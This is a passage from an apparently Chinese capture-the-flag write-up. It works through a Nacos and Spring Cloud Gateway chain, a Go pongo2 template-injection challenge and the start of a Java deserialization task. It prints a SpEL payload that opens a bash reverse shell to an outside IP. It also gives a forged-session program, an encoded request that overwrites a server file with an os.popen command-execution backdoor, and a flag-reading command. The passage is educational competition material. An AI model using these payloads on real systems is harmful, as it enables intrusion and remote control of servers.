href="https://cloud.tencent.com/developer/article/2070445">nacos未授权-CVE-2021-29441复现</a>    就是可以给后台加一个用户(<strong>用户名和密码自己可以设置</strong>)</p><p><img src="../images/image-20230531105226696.png" alt="image-20230531105226696"></p><p>然后进行登录</p><p><img src="../images/image-20230531105329173.png" alt="image-20230531105329173"></p><p>进入后台之后，这里就得用到jar包里的内容了</p><p><img src="../images/image-20230531105350138.png" alt="image-20230531105350138"></p><p>这些内容就是关键了</p><p><img src="../images/image-20230531105433101.png" alt="image-20230531105433101"></p><p>然后跟着里面进行操作就行了</p><p><a href="https://xz.aliyun.com/t/11493">Nacos结合Spring Cloud Gateway RCE利用</a></p><p><img src="../images/image-20230531105513222.png" alt="image-20230531105513222"></p><p>因为这里给的是yaml,而jar包里要求的是json</p><p>所以我们找一个在线网站来进行转化</p><p><img src="../images/image-20230531105603112.png" alt="image-20230531105603112"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;spring&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;cloud&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;gateway&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;routes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">          <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;exam&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;order&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;uri&quot;</span><span class="punctuation">:</span> <span class="string">&quot;lb://service-provider&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;predicates&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">              <span class="string">&quot;Path=/echo/**&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;filters&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">              <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AddResponseHeader&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;result&quot;</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&#123;new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;&#x27;bash&#x27;,&#x27;-c&#x27;,&#x27;bash -i &gt;&amp; /dev/tcp/101.42.39.110/3389 0&gt;&amp;1&#x27;&#125;).getInputStream())).replaceAll(&#x27;\n&#x27;,&#x27;&#x27;).replaceAll(&#x27;\r&#x27;,&#x27;&#x27;)&#125;&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">              <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">]</span></span><br><span class="line">          <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230531105642291.png" alt="image-20230531105642291"></p><p>这些地方跟着jar里的设置就行</p><p>写好，点击发布shell就会自动反弹了</p><p><img src="../images/image-20230531105827280.png" alt="image-20230531105827280"></p><p><strong>这题当时，没注意到jar包里的内容，老是去搜索这个nacos的版本漏洞，导致最后没成功</strong></p><h2 id="gosession-go-ssti-flask"><a href="#gosession-go-ssti-flask" class="headerlink" title="gosession(go-ssti-flask)"></a>gosession(go-ssti-flask)</h2><p><strong>route.go</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> route</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/flosch/pongo2/v6&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gorilla/sessions&quot;</span></span><br><span class="line"><span class="string">&quot;html&quot;</span></span><br><span class="line"><span class="string">&quot;io&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> store = sessions.NewCookieStore([]<span class="type">byte</span>(os.Getenv(<span class="string">&quot;SESSION_KEY&quot;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line">session.Values[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;guest&quot;</span></span><br><span class="line">err = session.Save(c.Request, c.Writer)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c.String(<span class="number">200</span>, <span class="string">&quot;Hello, guest&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Admin</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] != <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">name := c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;ssti&quot;</span>)</span><br><span class="line">xssWaf := html.EscapeString(name)</span><br><span class="line">tpl, err := pongo2.FromString(<span class="string">&quot;Hello &quot;</span> + xssWaf + <span class="string">&quot;!&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">out, err := tpl.Execute(pongo2.Context&#123;<span class="string">&quot;c&quot;</span>: c&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.String(<span class="number">200</span>, out)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Flask</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">resp, err := http.Get(<span class="string">&quot;http://127.0.0.1:5000/&quot;</span> + c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;guest&quot;</span>))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line">body, _ := io.ReadAll(resp.Body)</span><br><span class="line"></span><br><span class="line">c.String(<span class="number">200</span>, <span class="type">string</span>(body))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个一共有三个路由</p><ul><li>Index</li><li>Admin</li><li>Flask</li></ul><p><strong>先看Index路由</strong></p><p>Index路由内容很简单，直接赋了个session，session中的name值为guest，这⾥发现 session的key是通过SESSION_KEY环境变量获取的</p><p><img src="../images/image-20230530163802857.png" alt="image-20230530163802857"></p><p>这里的<code>err</code>是指，如果有报错的话，会把报错信息赋给这个<code>err</code></p><p>这里的<code>nil</code>是和<code>null</code>一个意思</p><p><strong>再看Admin路由：</strong></p><ul><li>这⾥对session做了验证，需要name为admin </li><li>这⾥⽤pongo2做模板渲染，存在模板渲染漏洞</li></ul><p><img src="../images/image-20230530164112496.png" alt="image-20230530164112496"></p><p><strong>接着看Flask路由：</strong></p><p>Flask路由会请求靶机⾥5000端⼝服务，并把请求⻚⾯回显</p><p><img src="../images/image-20230530164124171.png" alt="image-20230530164124171"></p><p>这里的入口点就是在这个Flask路由这里</p><p>通过使其报错<code>flask/?name=/</code> 得到下面的源码   <strong>server.py</strong></p><p><img src="../images/image-20230530164429706.png" alt="image-20230530164429706"></p><p>5000端⼝为python的flask服务，开启了debug模式，源码不存在ssti漏洞</p><p>(赛后复现的发现这里的<strong>seesion_key</strong>是空的。。。。。。。，当时是一直在找这个key)</p><p>接下来我们就去无key伪造session</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"> <span class="string">&quot;net/http&quot;</span></span><br><span class="line"> <span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"> <span class="string">&quot;github.com/gorilla/sessions&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"> <span class="keyword">var</span> store = sessions.NewCookieStore([]<span class="type">byte</span>(<span class="string">&quot;&quot;</span>))</span><br><span class="line"> r := gin.Default()</span><br><span class="line"> r.GET(<span class="string">&quot;/&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"> session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line"> <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"> http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"> <span class="keyword">return</span></span><br><span class="line"> &#125;</span><br><span class="line"> session.Values[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;admin&quot;</span></span><br><span class="line"> err = session.Save(c.Request, c.Writer)</span><br><span class="line"> <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"> http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"> <span class="keyword">return</span></span><br><span class="line"> &#125;</span><br><span class="line"> c.String(<span class="number">200</span>, <span class="string">&quot;Hello, guest&quot;</span>)</span><br><span class="line"> &#125;)</span><br><span class="line"> r.Run()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230530171541196.png" alt="image-20230530171541196"></p><p>根据这两个地方自己生成一个</p><p>这里的话这个代码可以在那个<code>gin</code>框架的github网站找到</p><p><img src="../images/image-20230530184301524.png" alt="image-20230530184301524"></p><p>然后加上那个seesions就行了</p><p><img src="../images/image-20230530184349321.png" alt="image-20230530184349321"></p><p>然后成功拿到伪造的<code>admin</code>的cookie</p><p><img src="../images/image-20230530184609077.png" alt="image-20230530184609077"></p><p>成功登录进admin路由</p><p>(<strong>这里使用的是go的ssti</strong>，<strong>使用的是pongo2的模板渲染</strong>)</p><p>接着构造请求包覆盖/app/server.py：</p><ul><li>注意name值需要url编码</li><li>c.HandlerName的值为<code>main/route.Admin</code>，接着用first过滤器获取到的就是<code>m</code>字符，用last过滤器获取到的就是<code>n</code>字符</li><li>注意GET请求也是可以使用表单上传文件的</li></ul><p><code>/admin?name=&#123;%set form=c.Query(c.HandlerName|first)%&#125;&#123;%set path=c.Query(c.HandlerName|last)%&#125;&#123;%set file=c.FormFile(form)%&#125;&#123;&#123;c.SaveUploadedFile(file,path)&#125;&#125;&amp;m=file&amp;n=/app/server.py</code></p><p>(<strong>这里听说的网上搜不到的，是靠自己翻pongo2的官方文档自己翻出来的</strong>)</p><p>这位师傅写了详细的分析流程  <a href="https://un1novvn.github.io/2023/05/29/ciscn2023/">找payload过程</a></p><p>这里的话是自己构造一个文件上传包来上传修改后的<code>server.py</code>来进行覆盖原来的代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">GET /admin?name=%7B%25<span class="built_in">set</span>%<span class="number">20</span>form%3Dc.Query(c.HandlerName%7Cfirst)%<span class="number">25</span>%7D%7B%25<span class="built_in">set</span>%20path%3Dc.Query(c.HandlerName%7Clast)%<span class="number">25</span>%7D%7B%25<span class="built_in">set</span>%20file%3Dc.FormFile(form)%<span class="number">25</span>%7D%7B%7Bc.SaveUploadedFile(file%2Cpath)%7D%7D&amp;m=file&amp;n=/app/server.py HTTP/<span class="number">1.1</span></span><br><span class="line">Host: 09b6676f-dac1-439f-be8a-1032efb446cc.challenge.ctf.show</span><br><span class="line">Content-Length: <span class="number">562</span></span><br><span class="line">Content-<span class="type">Type</span>: multipart/form-data; boundary=----WebKitFormBoundaryqwT9VdDXSgZPm0yn</span><br><span class="line">Cookie: session-name=MTY4NTE2OTE4MHxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXzUn0khtUAglbEqre0c-3PmfQg0snOpUCSYyvq07U4AKw==</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryqwT9VdDXSgZPm0yn</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;server.py&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: image/jpeg</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name = request.args[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">    res = os.popen(name).read()</span><br><span class="line">    <span class="keyword">return</span> res + <span class="string">&quot; no ssti&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;127.0.0.1&quot;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryqwT9VdDXSgZPm0yn</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">提交</span><br><span class="line">------WebKitFormBoundaryqwT9VdDXSgZPm0yn--</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里话为什么要构造这个(<strong>是别的师傅去翻pongo2的官方文档得出的</strong>)</p><p><img src="../images/image-20230530195427938.png" alt="image-20230530195427938"></p><p><img src="../images/image-20230530200113097.png" alt="image-20230530200113097"></p><p><code>http://09b6676f-dac1-439f-be8a-1032efb446cc.challenge.ctf.show/flask/?name=?name=cat$&#123;IFS&#125;/t*</code></p><p><strong>这里传两个name的原因是  第一个name是flask路由下的不能出错，不然会返回错误页面</strong>    </p><p>必须得让他走到访问5000端口这里，然后5000端口这里又有我们新覆盖的代码，一个name参数</p><h2 id="DeserBug"><a href="#DeserBug" class="headerlink" title="DeserBug"></a><strong>DeserBug</strong></h2><p>(后半场放出的提示<code>cn.hutool.json.JSONObject.put-&gt;com.app.Myexpect#getAnyexcept</code>)</p><p>这个题目给了jar包</p><p>这里的话我们先在本地搭一个环境来进行复现一下</p><p><img src="../images/image-20230529202349405.png" alt="image-20230529202349405"></p><p><img src="../images/image-20230529202356594.png" alt="image-20230529202356594"></p><p>搭建成功，这里的话就开始对jar包里的内容进行分析了</p><p><img src="../images/image-20230529205210683.png" alt="image-20230529205210683"></p><p><strong>这里给了一个cc3的依赖</strong></p><p><strong>Testapp.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.app;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.hutool.http.ContentType;</span><br><span class="line"><span class="keyword">import</span> cn.hutool.http.HttpUtil;</span><br><span class="line"><span class="keyword">import</span> cn.hutool.http.server.HttpServerRequest;</span><br><span class="line"><span class="keyword">import</span> cn.hutool.http.server.HttpServerResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Testapp</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    HttpUtil.createServer(<span class="number">8888</span>)</span><br><span class="line">      .addAction(<span class="string">&quot;/&quot;</span>, (request, response) -&gt; &#123;</span><br><span class="line">          <span class="type">String</span> <span class="variable">bugstr</span> <span class="operator">=</span> request.getParam(<span class="string">&quot;bugstr&quot;</span>);</span><br><span class="line">          <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">          <span class="keyword">if</span> (bugstr == <span class="literal">null</span>)</span><br><span class="line">            response.write(<span class="string">&quot;welcome,plz give me bugstr&quot;</span>, ContentType.TEXT_PLAIN.toString()); </span><br><span class="line">          <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] decode = Base64.getDecoder().decode(bugstr);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(decode));</span><br><span class="line">            <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> inputStream.readObject();</span><br><span class="line">            result = object.toString();</span><br><span class="line">          &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="type">Myexpect</span> <span class="variable">myexpect</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Myexpect</span>();</span><br><span class="line">            myexpect.setTypeparam(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;);</span><br><span class="line">            myexpect.setTypearg((Object[])<span class="keyword">new</span> <span class="title class_">String</span>[] &#123; e.toString() &#125;);</span><br><span class="line">            myexpect.setTargetclass(e.getClass());</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">              result = myexpect.getAnyexcept().toString();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">              result = ex.toString();</span><br><span class="line">            &#125; </span><br><span class="line">          &#125; </span><br><span class="line">          response.write(result, ContentType.TEXT_PLAIN.toString());</span><br><span class="line">        &#125;).start();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>Myexpect.java</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">package com.app;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Myexpect</span> <span class="keyword">extends</span> <span class="title">Exception</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> Class[] typeparam;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">private</span> Object[] typearg;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">private</span> Class targetclass;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String name;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String anyexcept;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> Class <span class="title function_ invoke__">getTargetclass</span>() &#123;</span><br><span class="line">    <span class="keyword">return</span> this.targetclass;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_ invoke__">setTargetclass</span>(Class targetclass) &#123;</span><br><span class="line">    this.targetclass = targetclass;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> Object[] <span class="title function_ invoke__">getTypearg</span>() &#123;</span><br><span class="line">    <span class="keyword">return</span> this.typearg;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_ invoke__">setTypearg</span>(Object[] typearg) &#123;</span><br><span class="line">    this.typearg = typearg;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> Object <span class="title function_ invoke__">getAnyexcept</span>() throws <span class="built_in">Exception</span> &#123;</span><br><span class="line">    Constructor con = this.targetclass.<span class="title function_ invoke__">getConstructor</span>(this.typeparam);</span><br><span class="line">    <span class="keyword">return</span> con.<span class="title function_ invoke__">newInstance</span>(this.typearg);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_ invoke__">setAnyexcept</span>(String anyexcept) &#123;</span><br><span class="line">    this.anyexcept = anyexcept;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> Class[] <span class="title function_ invoke__">getTypeparam</span>() &#123;</span><br><span class="line">    <span class="keyword">return</span> this.typeparam;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_ invoke__">setTypeparam</span>(Class[] typeparam) &#123;</span><br><span class="line">    this.typeparam = typeparam;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_ invoke__">getName</span>() &#123;</span><br><span class="line">    <span class="keyword">return</span> this.name;</span><br><span class="line">  &#125;</span><br><span 